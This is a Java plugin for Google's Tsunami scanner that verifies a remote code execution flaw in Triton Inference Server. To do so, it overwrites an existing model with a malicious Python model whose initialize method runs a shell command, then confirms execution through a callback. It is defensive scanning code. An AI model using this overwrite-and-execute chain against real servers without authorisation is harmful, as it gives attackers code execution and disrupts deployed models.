/*
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.MediaType.JSON_UTF_8;
import static com.google.common.net.MediaType.PLAIN_TEXT_UTF_8;
import static com.google.tsunami.common.data.NetworkServiceUtils.buildWebApplicationRootUrl;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.*;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.*;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.Base64;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the triton inference server RCE vulnerability. */
@ForWebService
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "TritonInferenceServerRceVulnDetector",
    version = "0.1",
    description =
        "This detector checks triton inference server RCE with explicit model-control option enabled",
    author = "secureness",
    bootstrapModule = TritonInferenceServerRceDetectorBootstrapModule.class)
public class TritonInferenceServerRceVulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final PayloadGenerator payloadGenerator;

  @VisibleForTesting
  static final String MODEL_CONFIG =
      "\n"
          + "name: \"%s\"\n"
          + "backend: \"python\"\n"
          + "\n"
          + "input [\n"
          + "  {\n"
          + "    name: \"input__0\"\n"
          + "    data_type: TYPE_FP32\n"
          + "    dims: [ -1, 3 ]\n"
          + "  }\n"
          + "]\n"
          + "\n"
          + "output [\n"
          + "  {\n"
          + "    name: \"output__0\"\n"
          + "    data_type: TYPE_FP32\n"
          + "    dims: [ -1, 1 ]\n"
          + "  }\n"
          + "]\n"
          + "\n"
          + "instance_group [\n"
          + "  {\n"
          + "    count: 1\n"
          + "    kind: KIND_CPU\n"
          + "  }\n"
          + "]\n"
          + "\n"
          + "parameters [\n"
          + "  {\n"
          + "    key: \"INFERENCE_MODE\"\n"
          + "    value: { string_value: \"true\" }\n"
          + "  }\n"
          + "]\n";

  @VisibleForTesting
  static final String PYTHON_MODEL =
      "import subprocess\n"
          + "class TritonPythonModel:\n"
          + "    def initialize(self, args):\n"
          + "        subprocess.run(\"%s\",shell=True)\n"
          + "    def execute(self, requests):\n"
          + "        return\n"
          + "    def finalize(self):\n"
          + "        return";

  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  TritonInferenceServerRceVulnDetector(
      HttpClient httpClient, @UtcClock Clock utcClock, PayloadGenerator payloadGenerator) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("TritonInferenceServerRceVulnDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  @VisibleForTesting
  String buildRootUri(NetworkService networkService) {
    return buildWebApplicationRootUrl(networkService);
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    if (!payloadGenerator.isCallbackServerEnabled()) {
      return false;
    }
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = payloadGenerator.generate(config);
    String cmd = payload.getPayload();

    final String rootUri = buildRootUri(networkService);

    try {
      HttpResponse modelNames =
          httpClient.send(
              post(rootUri + "v2/repository/index").withEmptyHeaders().build(), networkService);

      if (modelNames.bodyString().isEmpty()) {
        return false;
      }
      JsonArray modelNamesJO =
          JsonParser.parseString(modelNames.bodyString().get()).getAsJsonArray();
      if (modelNamesJO.isEmpty()) {
        return false;
      }
      String anExistingModelName = null;
      for (JsonElement modelNameJE : modelNamesJO) {
        if (modelNameJE.isJsonObject()) {
          JsonObject jsonObject = modelNameJE.getAsJsonObject();
          if (jsonObject.has("name")) {
            anExistingModelName = jsonObject.get("name").getAsString();
            break;
          }
        }
      }
      if (anExistingModelName == null) {
        return false;
      }
      // Attempting to unload model
      httpClient.send(
          post(String.format(rootUri + "v2/repository/models/%s/unload", anExistingModelName))
              .withEmptyHeaders()
              .build(),
          networkService);

      // Creating model repo layout: uploading model config
      httpClient.send(
          post(String.format(rootUri + "v2/repository/models/%s/load", anExistingModelName))
              .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
              .setRequestBody(
                  ByteString.copyFromUtf8(
                      String.format(
                          "{\"parameters\":{\"config\" : \"{}\", \"file:config.pbtxt\" :\"%s\" }}",
                          Base64.getEncoder()
                              .encodeToString(
                                  String.format(MODEL_CONFIG, anExistingModelName).getBytes()))))
              .build(),
          networkService);

      // Creating model repo layout: uploading the model
      httpClient.send(
          post(String.format(rootUri + "v2/repository/models/%s/load", anExistingModelName))
              .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
              .setRequestBody(
                  ByteString.copyFromUtf8(
                      String.format(
                          "{\"parameters\":{\"config\" : \"{}\", \"file:1/model.py\" : \"%s\" }}",
                          Base64.getEncoder()
                              .encodeToString(String.format(PYTHON_MODEL, cmd).getBytes()))))
              .build(),
          networkService);

      // Loading model to trigger payload
      httpClient.send(
          post(String.format(rootUri + "v2/repository/models/%s/load", anExistingModelName))
              .withEmptyHeaders()
              .build(),
          networkService);

      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
      return payload.checkIfExecuted();
    } catch (Exception e) {
      logger.atSevere().log("Failed to send request: %s", e.getMessage());
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("TritonInferenceServerRce"))
                .setSeverity(Severity.CRITICAL)
                .setTitle(
                    "This detector checks triton inference server RCE with explicit model-control option enabled")
                .setDescription(
                    "All versions of triton inference server with the `--model-control explicit` option"
                        + " and at least one loaded model can be overwritten by a malicious model and lead to RCE.")
                .setRecommendation(
                    "don't use `--model-control explicit` option with public access"))
        .build();
  }
}
